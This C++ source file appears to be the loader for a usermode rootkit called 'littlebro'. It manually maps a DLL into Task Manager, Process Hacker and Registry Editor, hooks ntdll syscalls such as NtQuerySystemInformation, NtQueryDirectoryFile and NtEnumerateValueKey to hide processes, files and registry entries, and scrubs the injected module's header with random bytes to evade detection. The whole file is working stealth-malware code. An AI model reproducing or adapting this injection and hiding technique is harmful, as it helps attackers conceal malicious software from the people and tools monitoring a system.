#include "stdafx.h"
#include "ntdll.hpp"
#include "rng.hpp"
#include "binary_file.hpp"
#include "manualmap.hpp"
#include "remote_detours.hpp"
#include <thread>

struct littlehook
{
	std::string module_name;
	std::string function_name;
	std::string hook_name;
};

int main()
{
	// INITIALISE DYNAMIC IMPORTS
	ntdll::initialise();

	// READ LITTLEBRO FROM DISK FOR INJECTION
	const auto littlebro_buffer = file::read_binary_file("littlebro.dll");

	// SETUP HOOK CONTAINER
	// FORMAT: MODULE NAME, FUNCTION NAME, EXPORT NAME
	const std::vector<littlehook> container =
	{
		// HOOK *ONLY* SYSCALLS
		{ "ntdll.dll", "NtOpenProcess",				"ntop" },
		{ "ntdll.dll", "NtQuerySystemInformation",	"qsi" },
		{ "ntdll.dll", "NtCreateFile",				"ntcr"},
		{ "ntdll.dll", "NtOpenFile",				"ntopf"},
		{ "ntdll.dll", "NtQueryDirectoryFile",		"ntqdf"},
		{ "ntdll.dll", "NtDeleteValueKey",			"ntdvk" },
		{ "ntdll.dll", "NtEnumerateValueKey",       "ntevk" }
	};

	for (const auto& process_name : { "taskmgr.exe", "processhacker.exe", "regedit.exe"/*, "explorer.exe"*/ })
	{
		auto process_list = get_all_processes(process_name);

		if (process_list.empty()) // NO PROCESSES FOUND
		{
			logger::log_formatted("process not running or elevation insufficient", process_name);
			continue;
		}

		// ENUMERATE ALL PROCESSES
		for (auto& proc : process_list)
		{
			logger::log_formatted("Target Process", process_name);

			// MAP LITTLEBRO INTO TARGET PROCESS
			const auto littlebro = injection::manualmap(proc).inject(littlebro_buffer);
			auto hooks = remote_detours{ proc, littlebro };
			// HOOK FUNCTIONS
			for (const auto& hook_data : container)
				hooks.hook_function({hook_data.module_name, hook_data.function_name}, hook_data.hook_name);
			/*
			std::this_thread::sleep_for(std::chrono::seconds(10));
			for (const auto& hook_data : container)
				hooks.reset_function({hook_data.module_name, hook_data.function_name}, hook_data.hook_name);
			*/
			// FILL HEADER SECTION WITH PSEUDO-RANDOM DATA
			auto junk_buffer = std::vector<std::uint8_t>(0x1000);
			std::generate(junk_buffer.begin(), junk_buffer.end(), [] { return static_cast<uint8_t>(rng::get_int<uint16_t>(0x00, 0xFF)); }); 
			proc.write_raw_memory(junk_buffer.data(), 0x1000, littlebro);
		}
	}

	logger::log("Finished!");
	std::cin.get();
	return 0;
}

